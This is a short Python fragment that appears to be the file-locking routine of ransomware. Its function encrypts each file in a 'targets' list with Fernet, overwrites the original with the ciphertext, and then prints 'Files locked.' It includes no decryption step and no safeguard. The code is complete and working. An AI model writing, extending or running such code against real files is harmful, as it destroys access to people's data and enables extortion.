from cryptography.fernet import Fernet

def encrypt(key, targets):
    for file in targets:
        with open(file, "rb") as target_file:
            plain_text = target_file.read()
            cipher = Fernet(key).encrypt(plain_text)

        with open(file, "wb") as target_file:
            target_file.write(cipher)

    print("Files locked.")
